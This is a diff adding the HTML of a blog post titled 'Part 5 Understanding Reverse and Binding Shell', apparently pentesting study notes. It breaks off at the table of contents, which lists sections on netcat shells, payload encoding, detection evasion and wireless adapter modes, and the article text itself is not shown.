@@ -1,0 +1,2379 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>Part 5 Understanding Reverse and Binding Shell &middot; Val&#39;s blog</title>
+    <meta name="title" content="Part 5 Understanding Reverse and Binding Shell &middot; Val&#39;s blog">
+
+  
+  <meta name="description" content="My awesome website">
+  <meta name="keywords" content="Networking,Shells,">
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.945f40c8e4498d89e2e59609a273bedf35ad7f2f70cc102c004d4deed71a818514c7f7c5bf3c7d1c48d55ae1184dde95e3517d9018b193f874c9f1ce68acbb0e.css"
+    integrity="sha512-lF9AyORJjYni5ZYJonO&#43;3zWtfy9wzBAsAE1N7tcagYUUx/fFvzx9HEjVWuEYTd6V41F9kBixk/h0yfHOaKy7Dg==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.1b8bce45adb10ff1218ae4c256a5b7bddb2880589dcbf6efd974fc2b9de8935c69d164c399db165f44f1ac4fc18e56cf63948ac0c988c06c5e8cf08ca98b174e.js"
+    integrity="sha512-G4vORa2xD/EhiuTCVqW3vdsogFidy/bv2XT8K53ok1xp0WTDmdsWX0TxrE/BjlbPY5SKwMmIwGxejPCMqYsXTg=="></script>
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.90867e4ceecde25580f418994053fd0749d446fd0e8f0028782793ec6434fb0945ecbfe21e6a8b2f788760c0ecc3663aacb155e42e4e73d79ebaebadecd201d2.js"
+      integrity="sha512-kIZ&#43;TO7N4lWA9BiZQFP9B0nURv0OjwAoeCeT7GQ0&#43;wlF7L/iHmqLL3iHYMDsw2Y6rLFV5C5Oc9eeuuut7NIB0g=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/">
+  <meta property="og:site_name" content="Val&#39;s blog">
+  <meta property="og:title" content="Part 5 Understanding Reverse and Binding Shell">
+  <meta property="og:description" content="My awesome website">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-05-22T09:09:02+00:00">
+    <meta property="article:modified_time" content="2024-05-22T09:09:02+00:00">
+    <meta property="article:tag" content="Networking">
+    <meta property="article:tag" content="Shells">
+    <meta property="og:image" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/featured.jpg">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/featured.jpg">
+  <meta name="twitter:title" content="Part 5 Understanding Reverse and Binding Shell">
+  <meta name="twitter:description" content="My awesome website">
+<meta name="twitter:image" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/featured.jpg">
+    <meta property="og:image" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/featured.jpg">
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Part 5 Understanding Reverse and Binding Shell",
+    "headline": "Part 5 Understanding Reverse and Binding Shell",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/ultimate-kali-linux-book\/part-5-understanding-reverse-and-binding-shell\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Valentin B"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-05-22T09:09:02\u002b00:00",
+    "datePublished": "2024-05-22T09:09:02\u002b00:00",
+    
+    "dateModified": "2024-05-22T09:09:02\u002b00:00",
+    
+    "keywords": ["Networking","Shells"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1064"
+  }]
+  </script>
+
+
+
+  
+  
+    <meta name="author" content="Valentin B">
+  
+  
+    
+      
+        
+      
+    
+      
+        
+          <link href="https://github.com/LiLTrash1" rel="me">
+        
+      
+    
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+      <div>
+        <a href="/" class="flex">
+          <span class="sr-only">Val&rsquo;s blog</span>
+          
+            <img
+              src="/img/big-cat.webp"
+              width="14"
+              height="15"
+              class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom"
+              alt="Val&#39;s blog">
+          
+        </a>
+      </div>
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Val&rsquo;s blog
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Blog">
+    Blog
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/series/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Series">
+    Series
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Blog">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/series/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Series">
+      Series
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+      
+      
+      
+      
+        
+    
+      <div
+        class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom"
+        style="background-image:url(/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/featured_hu_ae3d5ccb933f476c.jpg);"></div>
+    
+  
+      
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Part 5 Understanding Reverse and Binding Shell
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-05-22T09:09:02&#43;00:00">22 May, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1064 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="#/posts/Ultimate-Kali-Linux-Book/Part-5-Understanding-Reverse-and-Binding-Shell/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><path fill="currentColor" d="M441 58.9L453.1 71c9.4 9.4 9.4 24.6 0 33.9L424 134.1 377.9 88 407 58.9c9.4-9.4 24.6-9.4 33.9 0zM209.8 256.2L344 121.9 390.1 168 255.8 302.2c-2.9 2.9-6.5 5-10.4 6.1l-58.5 16.7 16.7-58.5c1.1-3.9 3.2-7.5 6.1-10.4zM373.1 25L175.8 222.2c-8.7 8.7-15 19.4-18.3 31.1l-28.6 100c-2.4 8.4-.1 17.4 6.1 23.6s15.2 8.5 23.6 6.1l100-28.6c11.8-3.4 22.5-9.7 31.1-18.3L487 138.9c28.1-28.1 28.1-73.7 0-101.8L474.9 25C446.8-3.1 401.2-3.1 373.1 25zM88 64C39.4 64 0 103.4 0 152V424c0 48.6 39.4 88 88 88H360c48.6 0 88-39.4 88-88V312c0-13.3-10.7-24-24-24s-24 10.7-24 24V424c0 22.1-17.9 40-40 40H88c-22.1 0-40-17.9-40-40V152c0-22.1 17.9-40 40-40H200c13.3 0 24-10.7 24-24s-10.7-24-24-24H88z"/></svg>
+  </span>
+
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/networking/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Networking
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/shells/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Shells
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
+        width="96"
+        height="96"
+        alt="Valentin B"
+        src="/img/lain-bear-icon_hu_5e233113a2b044ff.jpg">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Valentin B
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">Focusing on mastering penetration testing and digital forensics</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:valentinbergamotto@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/LiLTrash1"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div
+            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky 
+              lg:top-10
+            
+            ">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-fundamentals-of-bind-and-reverse-shells">1. Fundamentals of Bind and Reverse Shells</a>
+      <ul>
+        <li><a href="#12-creating-a-reverse--binding-shell-with-netcat">1.2 Creating a Reverse &amp; Binding Shell with Netcat</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-anti-malware-evasion-techniques">2. Anti-malware Evasion Techniques</a>
+      <ul>
+        <li><a href="#21-encoding-payloads-with-msfvenom">2.1 Encoding Payloads with MSFvenom</a></li>
+        <li><a href="#22-using-shellter-to-reduce-detection">2.2 Using Shellter to reduce detection</a></li>
+        <li><a href="#23-using-msf-to-send-a-reverse-shell-attack">2.3 Using MSF to Send a Reverse Shell Attack</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-wireless-adaptor-setup">3. Wireless Adaptor Setup</a>
+      <ul>
+        <li><a href="#31-different-types-of-adaptor-modes">3.1 Different types of Adaptor Modes</a></li>
+        <li><a href="#32-changing-between-managed-and-monitor-mode">3.2 Changing between Managed and Monitor Mode</a></li>
+        <li><a href="#33-testing-for-packet-injection-compatibility">3.3 Testing for Packet Injection Compatibility</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
